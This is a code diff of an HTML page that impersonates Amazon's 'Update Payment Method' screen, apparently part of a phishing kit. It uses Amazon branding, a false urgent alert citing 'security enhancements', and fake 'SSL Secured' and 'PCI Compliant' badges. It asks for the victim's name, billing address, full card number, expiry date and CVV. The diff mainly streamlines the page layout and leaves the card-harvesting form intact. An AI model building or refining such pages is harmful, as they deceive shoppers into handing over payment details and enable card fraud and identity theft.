@@ -9,20 +9,10 @@
     <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     <script src="https://cdn.jsdelivr.net/npm/places.js@1.19.0"></script>
     <style>
-        body { font-family: 'Ember', Arial, sans-serif; background-color: #f3f3f3; margin: 0; padding: 0; min-height: 100vh; }
-        .header { background-color: #232f3e; color: white; padding: 10px 20px; display: flex; align-items: center; justify-content: space-between; }
+        body { font-family: 'Ember', Arial, sans-serif; background-color: #f3f3f3; margin: 0; padding: 20px; min-height: 100vh; }
+        .header { background-color: #232f3e; color: white; padding: 10px 20px; text-align: center; }
         .header img { height: 30px; filter: brightness(0) invert(1); }
-        .header .nav { font-size: 14px; }
-        .header a { color: white; text-decoration: none; margin: 0 10px; }
-        .breadcrumb { background-color: #fff; padding: 10px 20px; border-bottom: 1px solid #ddd; font-size: 14px; color: #666; }
-        .breadcrumb a { color: #007185; text-decoration: none; }
-        .main { display: flex; }
-        .sidebar { width: 200px; background-color: #f8f8f8; padding: 20px; border-right: 1px solid #ddd; }
-        .sidebar h3 { font-size: 16px; margin-bottom: 10px; }
-        .sidebar ul { list-style: none; padding: 0; }
-        .sidebar li { margin-bottom: 8px; }
-        .sidebar a { color: #007185; text-decoration: none; font-size: 14px; }
-        .container { flex: 1; max-width: 600px; margin: 20px; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .container { max-width: 600px; margin: 20px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
         .alert { background-color: #fff8e1; border-left: 4px solid #ff9900; padding: 15px; margin-bottom: 20px; color: #333; }
         .alert h3 { margin: 0 0 10px 0; color: #c45500; font-size: 18px; }
         .title { font-size: 24px; font-weight: 500; color: #333; margin-bottom: 10px; }
@@ -50,123 +40,102 @@
         .loading i { font-size: 24px; }
         .footer { margin-top: 30px; text-align: center; font-size: 12px; color: #666; border-top: 1px solid #ddd; padding-top: 15px; }
         .footer a { color: #007185; text-decoration: none; margin: 0 5px; }
-        @media (max-width: 768px) { .main { flex-direction: column; } .sidebar { width: 100%; border-right: none; border-bottom: 1px solid #ddd; } .container { margin: 0; } }
+        @media (max-width: 768px) { .container { padding: 20px; } .row { flex-direction: column; } }
     </style>
 </head>
 <body>
     <div class="header">
         <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
-        <div class="nav">
-            <a href="#">Hello, Sign in</a>
-            <a href="#">Returns & Orders</a>
-            <a href="#">Cart</a>
-        </div>
     </div>
-    <div class="breadcrumb">
-        <a href="#">Amazon.com</a> › <a href="#">Your Account</a> › Update Payment Method
-    </div>
-    <div class="main">
-        <div class="sidebar">
-            <h3>Your Account</h3>
-            <ul>
-                <li><a href="#">Account & Lists</a></li>
-                <li><a href="#">Your Orders</a></li>
-                <li><a href="#">Your Addresses</a></li>
-                <li><a href="#">Payment Options</a></li>
-                <li><a href="#">Login & Security</a></li>
-                <li><a href="#">Prime Membership</a></li>
-            </ul>
+    <div class="container">
+        <div class="alert">
+            <h3>Payment Method Update Required</h3>
+            <p>Your payment method on file needs to be updated for continued service. This is due to recent account security enhancements. Please update your information below.</p>
         </div>
-        <div class="container">
-            <div class="alert">
-                <h3>Payment Method Update Required</h3>
-                <p>Your payment method on file needs to be updated for continued service. This is due to recent account security enhancements. Please update your information below.</p>
+        <div class="title">Update Payment Method</div>
+        <div class="subtitle">Securely update your payment information.</div>
+        <div class="secure-update">
+            <i class="fas fa-shield-alt"></i>
+            <p><strong>Secure Update:</strong> Your information is encrypted and protected. We never store your CVV.</p>
+        </div>
+        <form id="paymentForm">
+            <div class="form-group">
+                <label for="fullName">Full Name</label>
+                <input type="text" id="fullName" placeholder="John Doe" required>
             </div>
-            <div class="title">Update Payment Method</div>
-            <div class="subtitle">Securely update your payment information.</div>
-            <div class="secure-update">
-                <i class="fas fa-shield-alt"></i>
-                <p><strong>Secure Update:</strong> Your information is encrypted and protected. We never store your CVV.</p>
+            <div class="form-group">
+                <label for="billingAddress">Billing Address</label>
+                <input type="text" id="billingAddress" placeholder="Start typing your address..." required>
             </div>
-            <form id="paymentForm">
+            <div class="row">
                 <div class="form-group">
-                    <label for="fullName">Full Name</label>
-                    <input type="text" id="fullName" placeholder="John Doe" required>
-                </div>
-                <div class="form-group">
-                    <label for="billingAddress">Billing Address</label>
-                    <input type="text" id="billingAddress" placeholder="Start typing your address..." required>
-                </div>
-                <div class="row">
-                    <div class="form-group">
-                        <label for="billingCity">City</label>
-                        <input type="text" id="billingCity" placeholder="Anytown" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="billingState">State</label>
-                        <input type="text" id="billingState" placeholder="CA" required>
-                    </div>
-                </div>
-                <div class="row">
-                    <div class="form-group">
-                        <label for="billingZip">ZIP Code</label>
-                        <input type="text" id="billingZip" placeholder="12345" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="billingCountry">Country</label>
-                        <select id="billingCountry" required>
-                            <option value="">Select Country</option>
-                            <option value="US">United States</option>
-                            <option value="CA">Canada</option>
-                            <option value="UK">United Kingdom</option>
-                            <option value="AU">Australia</option>
-                            <option value="DE">Germany</option>
-                        </select>
-                    </div>
+                    <label for="billingCity">City</label>
+                    <input type="text" id="billingCity" placeholder="Anytown" required>
                 </div>
                 <div class="form-group">
-                    <label for="cardName">Name on Card</label>
-                    <input type="text" id="cardName" placeholder="John Doe" required>
+                    <label for="billingState">State</label>
+                    <input type="text" id="billingState" placeholder="CA" required>
+                </div>
+            </div>
+            <div class="row">
+                <div class="form-group">
+                    <label for="billingZip">ZIP Code</label>
+                    <input type="text" id="billingZip" placeholder="12345" required>
                 </div>
                 <div class="form-group">
-                    <label for="cardNumber">Card Number</label>
-                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                    <label for="billingCountry">Country</label>
+                    <select id="billingCountry" required>
+                        <option value="">Select Country</option>
+                        <option value="US">United States</option>
+                        <option value="CA">Canada</option>
+                        <option value="UK">United Kingdom</option>
+                        <option value="AU">Australia</option>
+                        <option value="DE">Germany</option>
+                    </select>
                 </div>
-                <div class="row">
-                    <div class="form-group">
-                        <label for="expMonth">Expiration Month</label>
-                        <input type="text" id="expMonth" placeholder="MM" maxlength="2" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="expYear">Expiration Year</label>
-                        <input type="text" id="expYear" placeholder="YYYY" maxlength="4" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="cvv">CVV</label>
-                        <input type="text" id="cvv" placeholder="123" maxlength="4" required>
-                    </div>
-                </div>
-                <div class="checkbox">
-                    <input type="checkbox" id="terms" required>
-                    <label for="terms">I agree to Amazon's <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=508088" target="_blank">Conditions of Use</a> and <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=468496" target="_blank">Privacy Notice</a>.</label>
-                </div>
-                <div class="g-recaptcha" data-sitekey="6LedQtQrAAAAAA6-Zkfv90E8SpWe9x6bWm9mt1Gk"></div>
-                <div id="errorMessage" class="error">Please complete all fields and the captcha.</div>
-                <div id="loading" class="loading">
-                    <i class="fas fa-spinner fa-spin"></i> Updating your payment method...
-                </div>
-                <button type="submit" id="submitBtn">Update Payment Method</button>
-            </form>
-            <div class="badges">
-                <div class="badge"><i class="fas fa-lock"></i> SSL Secured</div>
-                <div class="badge"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/41/Visa_Logo.png/100px-Visa_Logo.png" alt="Visa" style="height:20px;"></div>
-                <div class="badge"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/100px-MasterCard_Logo.svg.png" alt="Mastercard" style="height:20px;"></div>
-                <div class="badge"><i class="fab fa-cc-amex"></i> Amex</div>
-                <div class="badge"><i class="fas fa-shield-alt"></i> PCI Compliant</div>
             </div>
-            <div class="footer">
-                © 2025 Amazon.com, Inc. or its affiliates | <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=508088">Conditions of Use</a> | <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=468496">Privacy Notice</a> | <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=202134020">Interest-Based Ads</a> | <a href="https://www.amazon.com/privacy">Privacy Choices</a> | <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=508088">Help</a>
+            <div class="form-group">
+                <label for="cardName">Name on Card</label>
+                <input type="text" id="cardName" placeholder="John Doe" required>
             </div>
+            <div class="form-group">
+                <label for="cardNumber">Card Number</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+            </div>
+            <div class="row">
+                <div class="form-group">
+                    <label for="expMonth">Expiration Month</label>
+                    <input type="text" id="expMonth" placeholder="MM" maxlength="2" required>
+                </div>
+                <div class="form-group">
+                    <label for="expYear">Expiration Year</label>
+                    <input type="text" id="expYear" placeholder="YYYY" maxlength="4" required>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+                </div>
+            </div>
+            <div class="checkbox">
+                <input type="checkbox" id="terms" required>
+                <label for="terms">I agree to Amazon's <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=508088" target="_blank">Conditions of Use</a> and <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=468496" target="_blank">Privacy Notice</a>.</label>
+            </div>
+            <div class="g-recaptcha" data-sitekey="6LedQtQrAAAAAA6-Zkfv90E8SpWe9x6bWm9mt1Gk"></div>
+            <div id="errorMessage" class="error">Please complete all fields and the captcha.</div>
+            <div id="loading" class="loading">
+                <i class="fas fa-spinner fa-spin"></i> Updating your payment method...
+            </div>
+            <button type="submit" id="submitBtn">Update Payment Method</button>
+        </form>
+        <div class="badges">
+            <div class="badge"><i class="fas fa-lock"></i> SSL Secured</div>
+            <div class="badge"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/41/Visa_Logo.png/100px-Visa_Logo.png" alt="Visa" style="height:20px;"></div>
+            <div class="badge"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/100px-MasterCard_Logo.svg.png" alt="Mastercard" style="height:20px;"></div>
+            <div class="badge"><i class="fab fa-cc-amex"></i> Amex</div>
+            <div class="badge"><i class="fas fa-shield-alt"></i> PCI Compliant</div>
+        </div>
+        <div class="footer">
+            © 2025 Amazon.com, Inc. or its affiliates | <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=508088">Conditions of Use</a> | <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=468496">Privacy Notice</a> | <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=202134020">Interest-Based Ads</a>
         </div>
     </div>
 
